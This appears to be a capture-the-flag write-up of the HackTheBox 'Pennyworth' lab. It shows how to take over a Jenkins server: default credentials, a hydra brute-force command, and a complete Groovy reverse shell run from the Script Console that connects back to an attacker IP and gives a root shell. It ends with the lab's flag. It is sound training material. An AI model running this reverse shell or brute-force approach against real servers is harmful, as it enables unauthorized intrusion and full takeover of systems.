---
title: "HTB Pennyworth"
date: 2026-07-13
tags: [htb, very-easy, linux, jenkins, groovy, default-creds, reverse-shell]
platform: htb
description: "A single Jenkins server with a weak login. Guess the creds, drop a Groovy reverse shell from the Script Console, and you're already root."
outline: [2, 3]
---

# HTB Pennyworth

Very Easy Starting Point box, and it's basically one idea: there's a Jenkins server sitting on the internet with a weak password, and Jenkins hands anyone who logs in a built-in **Groovy Script Console** that runs code straight on the server. So the whole box is — get into Jenkins, then use that console to fire a reverse shell. And because this Jenkins runs as an admin-level user, that shell is already root. No second privesc step.

## Recon

nmap first, like always:

```bash
nmap -sV -sC 10.129.31.196
```

```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 9.4.39.v20210325
| http-robots.txt: 1 disallowed entry
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
```

Only one port open: **8080**, running Jetty. Jetty is the web server that ships inside Jenkins, so before I even open the page I've got a decent guess this is a Jenkins install. Browse to it:

```
http://10.129.31.196:8080
```

Sure enough — a Jenkins login page.

## Getting in — weak credentials

No exploit here, just a bad password. I started typing the obvious combos by hand — `admin`/`admin`, `root`/`root`, and so on — and **`root` / `password`** got me straight in.

That worked, but doing it by hand is slow and you'll miss combos. The proper way is to let a tool grind through a list for you. Jenkins takes a normal form POST, so hydra can do it — you just have to tell it what a *failed* login looks like so it knows which attempts to throw away:

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt \
  10.129.31.196 -s 8080 \
  http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password"
```

Same result, but that's the habit to build — manual guessing is fine for one or two tries, then automate.

## Foothold — the Groovy Script Console

Once you're logged in, the interesting page is the Script Console:

```
http://10.129.31.196:8080/script
```

This is a legit Jenkins feature — admins use it to run Groovy for troubleshooting — but "run arbitrary code on the server" is exactly what we want. So I grabbed a Groovy reverse shell. My go-to reference for payloads like this is PayloadsAllTheThings; it has a ready-made Groovy one:

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

First, start a listener on my box so the shell has somewhere to call back to:

```bash
nc -lvnp 8000
```

Then paste the Groovy into the Script Console, setting `host` to my attacker IP and `port` to the one I'm listening on (8000):

```groovy
String host="10.10.14.x";
int port=8000;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();po.flush();
  Thread.sleep(50);
  try {p.exitValue();break;}catch (Exception e){}
};
p.destroy();s.close();
```

![Jenkins Script Console with the Groovy reverse shell pasted in](/writeups/htb-pennyworth/script-console-groovy.png)

Hit **Run**, and the listener catches the connection:

```
connect to [10.10.14.x] from (UNKNOWN) [10.129.31.196] ...
whoami
root
```

Already root — because the Jenkins process itself is running with those privileges, the shell it spawns inherits them. That's why this box has no separate privilege-escalation stage.

## Flag

The flag isn't in a fixed spot, so rather than guessing paths I just searched the whole filesystem for it:

```bash
find / -type f -name flag.txt 2>/dev/null
```

(`2>/dev/null` hides all the "Permission denied" noise so only the real hit shows — same trick I lean on in every box.) `cat` the file it points to:

```
9cdfb439c7876e703e307864c9
```

Done. The takeaway I'd keep from this one: any time you see Jetty on 8080, think Jenkins, and any time you get into a Jenkins panel, `/script` is a straight shot to code execution — often, as here, as root.
